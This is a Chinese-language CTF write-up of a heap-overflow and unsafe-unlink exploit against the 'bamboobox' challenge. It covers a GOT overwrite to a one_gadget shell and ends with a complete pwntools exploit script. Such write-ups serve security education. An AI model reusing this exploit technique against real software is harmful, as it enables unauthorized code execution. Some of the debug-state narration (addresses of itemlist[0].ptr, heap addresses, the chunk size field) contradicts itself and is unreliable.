# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: No PIE (0x400000)
  - NX: NX enabled
  - RELRO: Partial RELRO
  - Canary: Found
  - Stack Protection: Enabled

# 漏洞成因
## 程序关键结构体
程序在bss段（地址`0x6020c0`）维护了一个`itemlist`数组，用于管理用户申请的堆块（item）。每个item由两个元素组成：一个存储用户指定的大小（`size`），另一个存储指向堆块的指针（`ptr`）。其逻辑结构如下：
```c
struct item {
    int size;
    char *ptr;
};
// itemlist 是一个长度为100的 item 数组
struct item itemlist[100];
```
全局变量`num`记录当前已分配的item数量。

## 漏洞定位
漏洞位于`change_item`函数中。该函数允许用户修改指定index的item内容。在读取用户输入的新内容时，使用了用户指定的新长度`v2`，但**没有校验`v2`是否小于或等于该item原始分配的大小**。这导致可以向目标堆块写入超出其边界的字节，从而引发**堆溢出**。
```c
// change_item 函数关键代码
printf("Please enter the length of item name:");
read(0, nptr, 8u);
v2 = atoi(nptr); // 用户控制的新长度v2
printf("Please enter the new name of the item:");
// 使用用户控制的v2作为读取长度，可能溢出chunk边界
*(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;
```

# 漏洞利用过程：
本利用通过堆溢出伪造一个处于释放状态的`free chunk`，并修改相邻下一个chunk的`prev_size`和`size`字段的`PREV_INUSE`标志位。随后释放该相邻chunk，触发`unlink`宏，将伪造chunk从双向链表中“卸下”。在unlink操作的过程中，通过精心构造的`fd`和`bk`指针，实现将`itemlist`中某个item的`ptr`改写为指向`itemlist`自身附近的地址（即`0x6020b0`）。之后通过编辑该item，即可向`itemlist`或GOT表等敏感区域写入数据，最终劫持控制流。

- Step1: 分配两个大小均为`0x80`的chunk，为后续构造fake chunk和触发unlink做准备。
- Step2: 利用堆溢出，在第一个chunk（`chunk0`）的用户数据区构造一个伪造的`free chunk`，并覆盖第二个chunk（`chunk1`）的`prev_size`和`size`字段，将`PREV_INUSE`位清零，制造`chunk1`前一个chunk为“free”状态的假象。
- Step3: 释放`chunk1`。由于`chunk1`的`PREV_INUSE`位为0，glibc会尝试向前合并，触发对前一个fake chunk的`unlink`操作。
- Step4: Unlink操作导致`itemlist[0].ptr`被修改为`&itemlist[0].ptr - 0x18`（即`0x6020b0`）。随后通过`change_item(0)`向该地址写入数据，即可覆盖`itemlist`本身。本步骤将`itemlist[0].ptr`覆盖为`atoi@got`的地址。
- Step5: 调用`show_item()`功能，此时程序会打印`itemlist[0].ptr`指向的内容，即`atoi`函数在libc中的实际地址，从而泄露libc基址。
- Step6: 根据泄露的`atoi`地址和已知的libc偏移，计算出`one_gadget`的地址。
- Step7: 再次通过`change_item(0)`，向`itemlist[0].ptr`（此时已指向`atoi@got`）写入`one_gadget`地址，完成GOT表劫持。
- Step8: 选择菜单选项`5`（退出），程序会调用`atoi`函数处理输入，实际跳转到`one_gadget`，获得shell。

## Step1
- 堆内存`0x39044030`处，此前的内容是`0x0000000000000000`，现在变成了`0x6161616100000000`（`"aaaa\0\0\0\0"`）。变化的原因是执行`malloc(0x80, 'aaaa')`，向第一个chunk写入了数据。
- 堆内存`0x390440c0`处，此前的内容是`0x0000000000000000`，现在变成了`0x6262626200000000`（`"bbbb\0\0\0\0"`）。变化的原因是执行`malloc(0x80, 'bbbb')`，向第二个chunk写入了数据。

## Step2
构造fake chunk并溢出修改`chunk1`的元数据。调试记录中未直接显示堆内存变化，但根据write-up中的gdb信息，在`chunk0`的用户数据区(`0x39044030`开始)构造了如下结构：
- `p64(0) + p64(0x81)`: 伪造chunk的`prev_size`和`size`。
- `p64(FD) + p64(BK)`: 伪造chunk的`fd`和`bk`指针，其中`FD=0x6020b0`，`BK=0x6020b8`，分别指向`itemlist[0].ptr - 0x18`和`itemlist[0].ptr - 0x10`。
- `"a"*0x60`: 填充数据。
- `p64(0x80) + p64(0x90)`: 溢出覆盖`chunk1`的`prev_size`为`0x80`，`size`为`0x90`（将原来的`0x91`改为`0x90`，清除了`PREV_INUSE`标志位）。

## Step3
释放`chunk1` (`free(1)`)。
- 堆内存`0x39044030`处，内容从`0x6161616100000000`变回`0x0000000000000000`。原因是`chunk0`在`change`操作时被新数据覆盖，旧数据被清空。
- 堆内存`0x39044038`（`chunk0`的`size`字段）处，内容从`0x8100000000000000`变为`0xd10f020000000000`。变化的原因是`chunk1`被释放后，与top chunk合并，导致`chunk0`的`size`字段被更新为合并后的大块尺寸（`0x20fd1`），并设置了`PREV_INUSE`标志。

## Step4
- `bss`段`0x6020c0` (`itemlist[0].ptr`)处，内容从`0x0000000000f4d030`（指向`chunk0`）变为`0x00000000006020b0`（指向`itemlist`自身附近）。这是Step3中`unlink`操作的结果。
- 执行`change(0, len(py2), py2)`，其中`py2 = b'a'*24 + p64(atoi_got)`。`atoi_got`地址被写入`0x6020c8`，即`itemlist[0].ptr`现在指向`atoi@got`。

## Step5
调用`show_item()`，程序打印`itemlist[0].ptr`指向的内容，即`atoi`函数在内存中的地址，成功泄露libc地址。

## Step6 & Step7
根据泄露的`atoi`地址计算`libc`基址和`one_gadget`地址，然后执行`change(0, 0x10, p64(onegadget))`。
- `bss`段`0x602068` (`atoi@got`)处，内容从原始的`atoi@plt`跳转地址被覆盖为计算得到的`one_gadget`地址。

## Step8
选择菜单选项`5`，程序流程进入`exit`分支，调用`goodbye_message()`，最终会调用`atoi(buf)`。由于`atoi@got`已被覆盖，实际执行`one_gadget`，获得shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')

local = 1
elf = ELF('./bamboobox')
if local:
    p = process('./bamboobox')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('./libc.so.6')

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def malloc(size,content):
    ru("Your choice:")
    sl('2')
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)
def free(index):
    ru("Your choice:")
    sl('4')
    ru("Please enter the index of item:")
    sl(str(index))
def change(index,size,content):
    ru("Your choice:")
    sl('3')
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the new name of the item:")
    sd(content)

magic = 0x400d49
atoi_got = elf.got["atoi"]

# Step1: 分配两个chunk
malloc(0x80,'aaaa')
malloc(0x80,'bbbb')

# Step2: 构造fake chunk并溢出修改下一个chunk的元数据
FD = 0x6020c8 - 3*8  # &itemlist[0].ptr - 0x18
BK = FD + 8          # &itemlist[0].ptr - 0x10
# 在chunk0构造fake free chunk: [prev_size|size|fd|bk|...]
# 然后溢出覆盖chunk1的prev_size和size(PREV_INUSE位清零)
py1 = p64(0) + p64(0x81) + p64(FD) + p64(BK)  # 伪造的chunk头
py1 += "a"*0x60                                # 填充
py1 += p64(0x80) + p64(0x90)                   # 覆盖chunk1的prev_size和size
change(0,0x90,py1) # 利用堆溢出写入构造的数据

# Step3: 释放chunk1，触发unlink
free(1)

# Step4: 此时itemlist[0].ptr指向0x6020b0。通过change向其写入数据，覆盖自身为atoi@got地址
py2 = ''
py2 += 'a'*24 + p64(atoi_got) # 前24字节填充，第25-32字节写入目标地址
change(0,len(py2),py2)

# Step5: 泄露atoi的真实地址
# 调用show，打印itemlist[0].ptr指向的内容，即atoi@got内的地址
p.sendlineafter('Your choice:', '1')
atoi_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info("atoi_addr: " + hex(atoi_addr))

# Step6 & Step7: 计算one_gadget地址并覆盖atoi@got
onegadget = atoi_addr - libc.symbols["atoi"] + 0xf02a4 # libc 2.23下的一个one_gadget偏移
log.info("onegadget: " + hex(onegadget))
change(0,0x10,p64(onegadget))

# Step8: 触发atoi调用，获得shell
p.sendlineafter('Your choice:', '5')

p.interactive()
```